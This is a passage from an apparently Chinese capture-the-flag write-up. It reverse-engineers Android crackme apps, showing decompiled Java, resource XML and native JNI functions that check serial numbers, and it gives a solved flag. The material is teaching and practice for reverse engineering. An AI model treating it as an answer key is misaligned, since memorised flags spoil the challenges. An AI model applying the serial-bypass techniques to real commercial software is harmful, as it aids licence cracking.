MainActivity.<span class="keyword">this</span>.edit_sn.getText().toString().trim())) &#123;</span><br><span class="line">                    Toast.makeText(MainActivity.<span class="keyword">this</span>, R.string.successed, <span class="number">0</span>).show();</span><br><span class="line">                    MainActivity.<span class="keyword">this</span>.btn_register.setEnabled(<span class="keyword">false</span>);</span><br><span class="line">                    MainActivity.<span class="keyword">this</span>.setTitle(R.string.registered);</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                Toast.makeText(MainActivity.<span class="keyword">this</span>, R.string.unsuccessed, <span class="number">0</span>).show();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">onCreateOptionsMenu</span><span class="params">(Menu menu)</span> </span>&#123;</span><br><span class="line">        getMenuInflater().inflate(R.menu.activity_main, menu);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">checkSN</span><span class="params">(String userName, String sn)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (userName.length() == <span class="number">0</span> &amp;&amp; sn.length() == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (userName == <span class="keyword">null</span> || userName.length() == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (sn == <span class="keyword">null</span> || sn.length() != <span class="number">16</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            MessageDigest digest = MessageDigest.getInstance(<span class="string">"MD5"</span>);</span><br><span class="line">            digest.reset();</span><br><span class="line">            digest.update(userName.getBytes());</span><br><span class="line">            String hexstr = toHexString(digest.digest(), BuildConfig.FLAVOR);</span><br><span class="line">            StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; hexstr.length(); i += <span class="number">2</span>) &#123;</span><br><span class="line">                sb.append(hexstr.charAt(i));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (sb.toString().equalsIgnoreCase(sn)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchAlgorithmException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title">toHexString</span><span class="params">(<span class="keyword">byte</span>[] bytes, String separator)</span> </span>&#123;</span><br><span class="line">        StringBuilder hexString = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">byte</span> b : bytes) &#123;</span><br><span class="line">            String hex = Integer.toHexString(b &amp; MotionEventCompat.ACTION_MASK);</span><br><span class="line">            <span class="keyword">if</span> (hex.length() == <span class="number">1</span>) &#123;</span><br><span class="line">                hexString.append(<span class="string">'0'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            hexString.append(hex).append(separator);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> hexString.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在资源中找到指定的字符串：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">resources</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span> <span class="attr">name</span>=<span class="string">"app_name"</span>&gt;</span>Crackme0201<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span> <span class="attr">name</span>=<span class="string">"hint_sn"</span>&gt;</span>请输入16位的注册码<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span> <span class="attr">name</span>=<span class="string">"hint_username"</span>&gt;</span>请输入用户名<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span> <span class="attr">name</span>=<span class="string">"info"</span>&gt;</span>Xman Android<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span> <span class="attr">name</span>=<span class="string">"menu_settings"</span>&gt;</span>Settings<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span> <span class="attr">name</span>=<span class="string">"register"</span>&gt;</span>注 册<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span> <span class="attr">name</span>=<span class="string">"registered"</span>&gt;</span>程序已注册<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span> <span class="attr">name</span>=<span class="string">"sn"</span>&gt;</span>注册码：<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span> <span class="attr">name</span>=<span class="string">"successed"</span>&gt;</span>md5:b3241668ecbeb19921fdac5ac1aafa69<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span> <span class="attr">name</span>=<span class="string">"title_activity_main"</span>&gt;</span>Crackme<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span> <span class="attr">name</span>=<span class="string">"unregister"</span>&gt;</span>程序未注册<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span> <span class="attr">name</span>=<span class="string">"unsuccessed"</span>&gt;</span>无效用户名或注册码<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span> <span class="attr">name</span>=<span class="string">"username"</span>&gt;</span>用户名：<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">resources</span>&gt;</span></span><br></pre></td></tr></table></figure><p>搜一下 MD5，得到原字符串为 <code>YOU_KNOW_</code>。但结果不对，网上找到别人的 wp，说另一半要结合 word 中的提示，出题人说他不懂安卓，那么我们就懂了，flag 就是 <code>YOU_KNOW_ANDROID</code>。</p><h1 id="黑客精神"><a href="#黑客精神" class="headerlink" title="黑客精神"></a>黑客精神</h1><p>这题相比前面的题目开始复杂起来了。在 MainActivity 中，看到一开始对一个 m 的值进行了判断。然后接下来在 onClick 中新建了一个 MyApp 实例，如果 m 为 0 就调用 doRegister 函数，其中跳转到 RegActivity。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.gdufs.xman;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.app.Activity;</span><br><span class="line"><span class="keyword">import</span> android.app.AlertDialog.Builder;</span><br><span class="line"><span class="keyword">import</span> android.content.ComponentName;</span><br><span class="line"><span class="keyword">import</span> android.content.DialogInterface;</span><br><span class="line"><span class="keyword">import</span> android.content.Intent;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.os.Process;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> android.view.Menu;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.view.View.OnClickListener;</span><br><span class="line"><span class="keyword">import</span> android.widget.Button;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">Activity</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String workString;</span><br><span class="line">    <span class="keyword">private</span> Button btn1;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        String str2;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        String str1 = <span class="string">"Xman"</span>;</span><br><span class="line">        Log.d(<span class="string">"com.gdufs.xman m="</span>, str1);</span><br><span class="line">        MyApp myApp = (MyApp) getApplication();</span><br><span class="line">        <span class="keyword">int</span> m = MyApp.m;</span><br><span class="line">        <span class="keyword">if</span> (m == <span class="number">0</span>) &#123;</span><br><span class="line">            str2 = <span class="string">"\u672a\u6ce8\u518c"</span>; <span class="comment">// 未注册</span></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (m == <span class="number">1</span>) &#123;</span><br><span class="line">            str2 = <span class="string">"\u5df2\u6ce8\u518c"</span>; <span class="comment">// 已注册</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            str2 = <span class="string">"\u5df2\u6df7\u4e71"</span>; <span class="comment">// 已混乱</span></span><br><span class="line">        &#125;</span><br><span class="line">        setTitle(str1 + str2);</span><br><span class="line">        <span class="keyword">this</span>.btn1 = (Button) findViewById(R.id.button1);</span><br><span class="line">        <span class="keyword">this</span>.btn1.setOnClickListener(<span class="keyword">new</span> OnClickListener() &#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">                MyApp myApp = (MyApp) MainActivity.<span class="keyword">this</span>.getApplication();</span><br><span class="line">                <span class="keyword">if</span> (MyApp.m == <span class="number">0</span>) &#123;</span><br><span class="line">                    MainActivity.<span class="keyword">this</span>.doRegister();</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                ((MyApp) MainActivity.<span class="keyword">this</span>.getApplication()).work();</span><br><span class="line">                Toast.makeText(MainActivity.<span class="keyword">this</span>.getApplicationContext(), MainActivity.workString, <span class="number">0</span>).show();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doRegister</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">new</span> Builder(<span class="keyword">this</span>).setTitle(<span class="string">"\u6ce8\u518c"</span>).setMessage(<span class="string">"Flag\u5c31\u5728\u524d\u65b9\uff01"</span>).setPositiveButton(<span class="string">"\u6ce8\u518c"</span>, <span class="keyword">new</span> DialogInterface.OnClickListener() &#123; <span class="comment">// Title =&gt; 注册 | Message =&gt; Flag就在前方！ | PositiveButton =&gt; 注册</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(DialogInterface dialog, <span class="keyword">int</span> which)</span> </span>&#123;</span><br><span class="line">                Intent intent = <span class="keyword">new</span> Intent();</span><br><span class="line">                intent.setComponent(<span class="keyword">new</span> ComponentName(BuildConfig.APPLICATION_ID, <span class="string">"com.gdufs.xman.RegActivity"</span>));</span><br><span class="line">                MainActivity.<span class="keyword">this</span>.startActivity(intent); <span class="comment">// 跳转到RegActivity</span></span><br><span class="line">                MainActivity.<span class="keyword">this</span>.finish();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).setNegativeButton(<span class="string">"\u4e0d\u73a9\u4e86"</span>, <span class="keyword">new</span> DialogInterface.OnClickListener() &#123; <span class="comment">// NagetiveButton =&gt; 不玩了</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(DialogInterface dialog, <span class="keyword">int</span> which)</span> </span>&#123;</span><br><span class="line">                Process.killProcess(Process.myPid());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).show();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">work</span><span class="params">(String str)</span> </span>&#123;</span><br><span class="line">        workString = str;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">onCreateOptionsMenu</span><span class="params">(Menu menu)</span> </span>&#123;</span><br><span class="line">        getMenuInflater().inflate(R.menu.menu_main, menu);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后看一下 MyApp 类中，发现分别有三个函数在 Native 层实现。其中 onCreate 中调用了 initSN 函数。SN 猜测是 Serial Number 即序列号：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.gdufs.xman;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.app.Application;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyApp</span> <span class="keyword">extends</span> <span class="title">Application</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> m = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title">initSN</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title">saveSN</span><span class="params">(String str)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title">work</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.loadLibrary(<span class="string">"myjni"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        initSN();</span><br><span class="line">        Log.d(<span class="string">"com.gdufs.xman m="</span>, String.valueOf(m));</span><br><span class="line">        <span class="keyword">super</span>.onCreate();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>RegActivity 中获取输入的字符串，并作为 SN 传入 saveSN 函数。然后 App 将会把自己的进程杀死：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.gdufs.xman;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.app.Activity;</span><br><span class="line"><span class="keyword">import</span> android.app.AlertDialog.Builder;</span><br><span class="line"><span class="keyword">import</span> android.content.DialogInterface;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.os.Process;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.view.View.OnClickListener;</span><br><span class="line"><span class="keyword">import</span> android.widget.Button;</span><br><span class="line"><span class="keyword">import</span> android.widget.EditText;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RegActivity</span> <span class="keyword">extends</span> <span class="title">Activity</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Button btn_reg;</span><br><span class="line">    <span class="keyword">private</span> EditText edit_sn;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_reg);</span><br><span class="line">        <span class="keyword">this</span>.btn_reg = (Button) findViewById(R.id.button1);</span><br><span class="line">        <span class="keyword">this</span>.edit_sn = (EditText) findViewById(R.id.editText1);</span><br><span class="line">        <span class="keyword">this</span>.btn_reg.setOnClickListener(<span class="keyword">new</span> OnClickListener() &#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">                String sn = RegActivity.<span class="keyword">this</span>.edit_sn.getText().toString().trim();</span><br><span class="line">                <span class="keyword">if</span> (sn == <span class="keyword">null</span> || sn.length() == <span class="number">0</span>) &#123;</span><br><span class="line">                    Toast.makeText(RegActivity.<span class="keyword">this</span>, <span class="string">"\u60a8\u7684\u8f93\u5165\u4e3a\u7a7a"</span>, <span class="number">0</span>).show(); <span class="comment">// 您的输入为空</span></span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                ((MyApp) RegActivity.<span class="keyword">this</span>.getApplication()).saveSN(sn);</span><br><span class="line">                <span class="keyword">new</span> Builder(RegActivity.<span class="keyword">this</span>).setTitle(<span class="string">"\u56de\u590d"</span>).setMessage(<span class="string">"\u60a8\u7684\u6ce8\u518c\u7801\u5df2\u4fdd\u5b58"</span>).setPositiveButton(<span class="string">"\u597d\u5427"</span>, <span class="keyword">new</span> DialogInterface.OnClickListener() &#123; <span class="comment">// Title =&gt; 回复 | Message =&gt; 您的注册码已保存 | PositiveButton =&gt; 好吧</span></span><br><span class="line">                    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(DialogInterface dialog, <span class="keyword">int</span> which)</span> </span>&#123;</span><br><span class="line">                        Process.killProcess(Process.myPid());</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;).show();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么基本上就是求出正确的 SN 了。在 Native 查看，发现函数在 JNI_OnLoad 中动态注册：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> <span class="keyword">int</span> __<span class="function">fastcall <span class="title">JNI_OnLoad</span><span class="params">(_JavaVM *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( a1-&gt;functions-&gt;GetEnv(&amp;a1-&gt;functions, (<span class="keyword">void</span> **)&amp;g_env, <span class="number">65542</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  _android_log_print(<span class="number">2</span>, <span class="string">"com.gdufs.xman"</span>, <span class="string">"JNI_OnLoad()"</span>);</span><br><span class="line">  native_class = (<span class="keyword">int</span>)g_env-&gt;functions-&gt;FindClass(&amp;g_env-&gt;functions, <span class="string">"com/gdufs/xman/MyApp"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !g_env-&gt;functions-&gt;RegisterNatives(&amp;g_env-&gt;functions, (jclass)native_class, (<span class="keyword">const</span> JNINativeMethod *)gMethods, <span class="number">3</span>) )<span class="comment">// register 3 methods</span></span><br><span class="line">  &#123;</span><br><span class="line">    _android_log_print(<span class="number">2</span>, <span class="string">"com.gdufs.xman"</span>, <span class="string">"RegisterNatives() --&gt; nativeMethod() ok"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">65542</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  _android_log_print(<span class="number">6</span>, <span class="string">"com.gdufs.xman"</span>, <span class="string">"RegisterNatives() --&gt; nativeMethod() failed"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先来看 initSN，其中读取 <code>/sdcard/reg.dat</code> 中的内容并和 <code>EoPAoY62@ElRD</code> 进行比较：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">fastcall <span class="title">initSN</span><span class="params">(_JNIEnv *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _JNIEnv *env; <span class="comment">// r6</span></span><br><span class="line">  FILE *f; <span class="comment">// r0</span></span><br><span class="line">  FILE *f_1; <span class="comment">// r4</span></span><br><span class="line">  _JNIEnv *env_1; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// r1</span></span><br><span class="line">  <span class="keyword">int</span> len; <span class="comment">// r7</span></span><br><span class="line">  <span class="keyword">char</span> *data; <span class="comment">// r5</span></span><br><span class="line">  _JNIEnv *env_2; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// r1</span></span><br><span class="line"></span><br><span class="line">  env = a1;</span><br><span class="line">  f = fopen(<span class="string">"/sdcard/reg.dat"</span>, <span class="string">"r+"</span>);</span><br><span class="line">  f_1 = f;</span><br><span class="line">  <span class="keyword">if</span> ( !f )                                     <span class="comment">// read file error</span></span><br><span class="line">  &#123;</span><br><span class="line">    env_1 = env;</span><br><span class="line">    v5 = (<span class="keyword">int</span>)f_1;</span><br><span class="line">LABEL_5:</span><br><span class="line">    setValue(env_1, v5);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  fseek(f, <span class="number">0</span>, <span class="number">2</span>);                               <span class="comment">// seek to file end ( SEEK_END )</span></span><br><span class="line">  len = ftell(f_1);</span><br><span class="line">  data = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(len + <span class="number">1</span>);               <span class="comment">// malloc error</span></span><br><span class="line">  <span class="keyword">if</span> ( !data )</span><br><span class="line">  &#123;</span><br><span class="line">    fclose(f_1);</span><br><span class="line">    env_1 = env;</span><br><span class="line">    v5 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_5;</span><br><span class="line">  &#125;</span><br><span class="line">  fseek(f_1, <span class="number">0</span>, <span class="number">0</span>);                             <span class="comment">// seek to file start ( SEEK_SET )</span></span><br><span class="line">  fread(data, len, <span class="number">1u</span>, f_1);</span><br><span class="line">  data[len] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(data, <span class="string">"EoPAoY62@ElRD"</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    env_2 = env;</span><br><span class="line">    v9 = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    env_2 = env;</span><br><span class="line">    v9 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  setValue(env_2, v9);</span><br><span class="line">  j_fclose(f_1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中看到有一个 setValue 函数，将 m 的值设为指定的值：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">fastcall <span class="title">setValue</span><span class="params">(_JNIEnv *a1, <span class="keyword">int</span> val)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> val_1; <span class="comment">// r7</span></span><br><span class="line">  _JNIEnv *v3; <span class="comment">// r4</span></span><br><span class="line">  jclass v4; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">void</span> *v5; <span class="comment">// r5</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">jfieldID</span> *<span class="title">v6</span>;</span> <span class="comment">// r0</span></span><br><span class="line"></span><br><span class="line">  val_1 = val;</span><br><span class="line">  v3 = a1;</span><br><span class="line">  v4 = 